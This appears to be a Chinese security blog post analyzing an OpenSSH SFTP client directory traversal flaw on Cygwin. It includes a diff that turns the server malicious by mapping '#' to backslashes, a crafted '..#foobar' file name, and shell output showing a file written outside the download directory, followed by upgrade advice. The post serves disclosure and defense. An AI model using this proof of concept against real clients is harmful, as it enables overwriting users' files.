Cygwin上的OpenSSH：SFTP客户端目录遍历漏洞分析

Stbird • 2017年3月22日 • Web安全 • 阅读 457

0x01  概述

cygwin是一个在windows平台上运行的unix模拟环境，是cygnus solutions公司开发的自由软件（该公司开发了很多好东西，著名的还有eCos，不过现已被Redhat收购）。它对于学习unix/linux操作环境，或者从unix到windows的应用程序移植，或者进行某些特殊的开发工作，尤其是使用gnu工具集在windows上进行嵌入式系统开发，非常有用。随着嵌入式系统开发在国内日渐流行，越来越多的开发者对cygwin产生了兴趣。

英文官网http://cygwin.com/install.html             中文官网http://www.cygwin.cn/

OpenSSH是使用SSH协议进行远程登录的首选连接工具。它加密所有流量，以消除窃听，连接劫持和其他攻击。此外，OpenSSH提供了大量的安全隧道功能，多种身份验证方法和复杂的配置选项。2017年3月20日发布OpenSSH 7.5。

英文官网：http://www.openssh.com/

0x02  漏洞分析

Portable OpenSSH支持在Cygwin上运行，但是SFTP客户端只过滤掉了正斜杠(在do_lsreaddir())和目录名称中的”.” 和”..“（在download_dir_internal()）。在Windows上，包括在Cygwin中，反斜杠也可以用于目录遍历。

在服务器上，Patch OpenSSH经常这样构建它：

--- openssh-7.4p1/sftp-server.c 2016-12-18 20:59:41.000000000 -0800
+++ openssh-7.4p1-patched/sftp-server.c 2016-12-20 15:55:34.980000300 -0800
@@ -1065,10 +1065,11 @@
 strcmp(path, "/") ? "/" : "", dp->d_name);
 if (lstat(pathname, &st) < 0)
 continue;
 stat_to_attrib(&st, &(stats[count].attrib));
 stats[count].name = xstrdup(dp->d_name);
+for (i=0; i<strlen(stats[count].name); i++) if (stats[count].name[i] == '#') 
stats[count].name[i] = '\\';
 stats[count].long_name = ls_file(dp->d_name, &st, 0, 0);
 count++;
 /* send up to 100 entries in one message */
 /* XXX check packet size instead */
 if (count == 100)

这样可以确保OpenSSH服务正在运行。

我们先创建以下目录结构：

user@DESKTOP ~
$ mkdir -p sourceparent/source
user@DESKTOP ~
$ touch 'sourceparent/source/..#foobar'
user@DESKTOP ~
$ echo foobar > sourceparent/foobar
user@DESKTOP ~
$

现在，在客户端（Windows 10上的Cygwin）上，构建OpenSSH，然后递归下载如下所示目录：

user@DESKTOP ~
$ mkdir destparent
user@DESKTOP ~
$ cd destparent/
user@DESKTOP ~/destparent
$ ls -la
total 4
drwxr-xr-x+ 1 user None 0 Dec 20 16:24 .
drwxr-xr-x+ 1 user None 0 Dec 20 16:24 ..
user@DESKTOP ~/destparent
$ ~/openssh-7.4p1/sftp -r -s /home/user/openssh-7.4p1-patched/sftp-server
 localhost:sourceparent/source dest
Connected to localhost.
Fetching /home/user/sourceparent/source/ to dest
Retrieving /home/user/sourceparent/source
user@DESKTOP ~/destparent
$ ls -la
total 5
drwxr-xr-x+ 1 user None 0 Dec 20 16:24 .
drwxr-xr-x+ 1 user None 0 Dec 20 16:24 ..
drwxr-xr-x+ 1 user None 0 Dec 20 16:24 dest
-rwxr-xr-x 1 user None 7 Dec 20 16:24 foobar
user@DESKTOP ~/destparent
$

如你所见，sftp在指定的目标目录“dest”之外创建了文件“foobar”。也就是说，这个漏洞可以在Cygwin上创建或修改目标目录之外的文件。

此漏洞已经在OpenSHH 7.5中修复，建议升级低版本OpenSHH到OpenSHH 7.5版本
